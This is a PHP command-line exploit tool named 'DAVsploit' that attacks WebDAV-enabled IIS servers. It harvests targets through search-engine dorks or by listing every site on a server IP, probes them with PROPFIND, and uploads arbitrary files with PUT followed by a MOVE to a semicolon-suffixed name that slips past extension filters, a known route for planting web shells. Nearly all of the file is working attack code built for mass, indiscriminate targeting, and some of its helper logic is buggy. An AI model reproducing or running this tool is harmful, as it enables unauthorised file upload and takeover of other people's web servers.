<?php
set_time_limit(0);
error_reporting(0);

echo '            
  _________  ____    __         _       ___   
  \_   __  \/  \ \  / /__ ____ | | ___ |_| |_ 
    | |  / / /\ \ \/ / __/  _ \| |/ _ \| |  _\ 
    | |_/ / /__\ \  /__  | | | | | |_| | | |___
    |____/________\/____/| ||_/|_|\___/|_|_____\
    -------------------- |_| -------------------  

';

$arg = getopt('', array('url:', 'multi:', 'server:', 'upload:', 'valid', 'dork:', 'nolog'));

if(isset($arg['url'])) {
	
	vector();
	
	$url = preg_replace('#https?://#', '', $arg['url']);

	if(isset($arg['upload'])) upload($url, $arg['upload']);
	if(isset($arg['valid'])) valid($url);

} elseif(isset($arg['multi'])) {
	
	vector();

	if(!is_file($arg['multi'])) die('    [!] cannot find' . $arg['multi'] . "\n\n\n");

	$list = listfunc(file($arg['multi'], FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));

	if(isset($arg['upload'])) upload($list, $arg['upload']);
	if(isset($arg['valid'])) valid($list);

} elseif(isset($arg[server])) {

	vector();

	if(filter_var($arg[server], FILTER_VALIDATE_IP)) $ip = $arg[server];
	else {

		$site = preg_replace("/http:\/\//", "", $arg[server]);
		$ip = gethostbyname($site);
		
		if(!filter_var($ip, FILTER_VALIDATE_IP)) die('    [*] cannot retrieve server ip address' . "\n\n\n");

	}

	echo '    [*] ip address : ' . $ip . "\n\n";
	
	$list = listfunc(dork('yahoo', 'ip:' . $ip));
	
	if(isset($arg['valid'])) valid($list[0], 1);
	
	if(isset($arg['upload'])) {

		if(!isset($arg['nolog'])) {

			if(in_array($ip, file('ip.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES))) {
			
				echo '    [*] the server had been scanned before. continue? (y/n) ';
				$input = trim(fgets(STDIN));
				echo "\n\n";
				
				if(!preg_match('#(y|yes)#i', $input)) exit;
			
			} else file_put_contents('ip.txt', $ip . "\n", FILE_APPEND);

		}

		upload($list, $arg['upload']);

	}
	
} elseif(isset($arg['dork'])) {

	vector();

	$exp = explode(',', $arg['dork']);

	if(!isset($exp[1])) die('   [!] invalid dork argument' . "\n\n");
	if(!preg_match('#(ask|bing|conduit|yahoo)#i', $exp[0])) die('   [!] invalid dork engine' . "\n\n");

	$list = listfunc(dork($exp[0], $exp[1]));
	
	if(isset($arg['upload'])) upload($list, $arg['upload']);
	if(isset($arg['valid'])) valid($list);

} else {

	echo '    DAVsploit is an automated exploit pack created to pentest WebDAV enabled 
    
    IIS server(s) by performing remote authentication attacks
        
	
    target :

        --url [URL]              set a single target to the URL provided
        --multi [LIST]           set multiple targets enlisted in textual file
        --server [IP|DOMAIN]     set multiple targets hosted in the same server
        --dork [ENGINE,DORK]     set multiple target from search dorks
		

    attack vector :	
		
        --upload [FILE]          upload file to server (extension bypass)
        --valid                  scan for webDAV possible vulnerability	 


    special :

        --nolog                  do not keep log of the ip address 


    engine (dork usage) :
	
        ask                      www.ask.com
        bing                     www.bing.com
        conduit                  search.conduit.com
        yahoo                    search.yahoo.com
    

    example:

        php ' . $argv[0] . ' --url site.com --upload x.html
        php ' . $argv[0] . ' --multi list.txt --valid
        php ' . $argv[0] . ' --server 127.0.0.1 --upload x.txt
        php ' . $argv[0] . ' --dork conduit,inurl:asp --valid';

}

echo "\n\n";
exit;

function listfunc($list) {

	array_unique($list);

	if(count($list) !== 0) echo '    [*] ' . count($list) . ' URLs loaded' . "\n\n";
	else die('    [!] no URLs retrieved' . "\n\n\n");

	return $list;

}

function vector() {

	if(!isset($arg['valid']) AND !isset($arg['upload'])) die('    [!] cannot determine attack vector' . "\n\n\n");

}

function upload($urls, $file) {

	if(!is_file($file)) die('    [!] cannot find ' . $file . "\n\n\n");

	$filename = basename($file);
	$exp = explode('.', $filename);
	$size = filesize($file);
	$fh = fopen($file, "r");
	$bypass = false;
	
	if($exp[1] !== 'txt' && $exp[1] !== 'htm' && $exp[1] !== 'html') {

		echo '    [*] the file will be uploaded as ' . $filename . ';.txt' . "\n\n";
		
		$filename =  $filename . ';.txt';
		$bypass = true;

	}

	foreach ((array)$urls as $url) {
		
		$putopts = array(

			CURLOPT_URL => $url . '/' . $exp[0] . ($bypass ? '.txt' : $exp[1]),
			CURLOPT_UPLOAD => true,
			CURLOPT_PUT => true,
			CURLOPT_INFILE => $fh,
			CURLOPT_INFILESIZE => $size

			);

		if(curlRequest($putopts, '#(ok|created)#i')) {

			if($bypass) {

				$moveopts = array(

						CURLOPT_URL => $url . '/' . $exp[0] . '.txt',
						CURLOPT_CUSTOMREQUEST => 'MOVE',
						CURLOPT_HTTPHEADER => array('Destination: http://' . $url . '/' . $filename)

					);
						
				$response = curlRequest($moveopts, '#(created|no content)#i') ? true : false;
							
			} else $response = true;

		} else $response = false;

		if($response) echo '    [+] ' . $filename . ' was successfully uploaded' . "\n";
		else echo '   [-] failed to upload ' . basename($file) . "\n";
 
	}

}

function valid($urls, $server = false) {

	foreach((array)$urls as $url) {

		$opts = array(

			CURLOPT_URL => $url,
			CURLOPT_CUSTOMREQUEST => 'PROPFIND',
			CURLOPT_HTTPHEADER => array('Content-Type: txt/xml', 'Content-Length: 0')

			);

		if(curlRequest($opts, '#multi-status#i')) die('    [+] ' . $server ? 'server' : $url . ' is possibly vulnerable ' . "\n\n\n");
		else die('    [-] ' . $server ? 'server' : $url . ' is not vulnerable' . "\n\n\n");

	}

}

function clean($url) {

	$url = preg_replace('/https?:\/\//', '', $url);

	if(stripos('/', $url) !== false) {

		$exp = explode('/', $url);
		return $exp[0];

	} else return $url; 

}

function yclean($url) {

	$exp = explode('**', $url);
	$lode = explode('/', urldecode($exp[1]));
	return $lode[2];

}

function dork($engine, $dork) {

	$dork = urlencode(stripslashes($dork));
	$urls = array();
	
	if($engine == 'ask') {

		$search = 'http://www.ask.com/web?q=';
		$page = '&page=';
		$regex = '#class="url txt_lg" href="([^"]+)"#';
		$next = '/>Next&#160;&#187;/';
		$start = 1;
	
	} elseif($engine === 'conduit'){

		$search = 'http://search.conduit.com/Results.aspx?q=';
		$page = '&start=';
		$regex = '#<div class="title"><a href="([^"]+)"#';
		$next = '#Next <span class="paging_icon next">#';
		$start = 0;

	} elseif($engine === 'bing') {

		$search = 'http://www.bing.com/search?q=';
		$page = '&first=';	
		$regex = '#<div class="sb_tlst"><h3><a href="([^"]+)"#';
		$next = '#Next</a></li></ul>#';
		$start = 0;
	
	} elseif($engine === 'yahoo') {
	
		$search = 'http://search.yahoo.com/search?p=';
		$page = '&b=';	
		$regex = '#class="yschttl spt" href="([^"]+)"#';
		$next = '#Next</a><span>#';
		$start = 0;
	
	}
	
	for($id = $start ;; $id++) {
		
		$id = $engine == 'ask' ?: $id = $id * 10 + 1;
		
		$result = file_get_contents($search . $dork . $page . $id);
		preg_match_all($regex, $result, $matches);
		
		foreach($matches[1] as $site) {
			
			if($engine === "yahoo") array_push($urls, yclean($site));
			else array_push($urls, clean($site));

		}
		
		if(!preg_match($next, $result)) break;
		
	}
	
	return array_unique($urls);

}

function curlRequest($options, $pattern) {

	$c = curl_init();

	$general =  array(

		CURLOPT_RETURNTRANSFER => true,
		CURLOPT_HEADER => true,
		CURLOPT_NOBODY => true,
		CURLOPT_CONNECTTIMEOUT => 10,
		CURLOPT_TIMEOUT => 10

		);

	curl_setopt_array($c, $general + $options);
	$response = curl_exec($c);
	curl_close($c);

	return preg_match($pattern, $response) ? true : false;

}

?>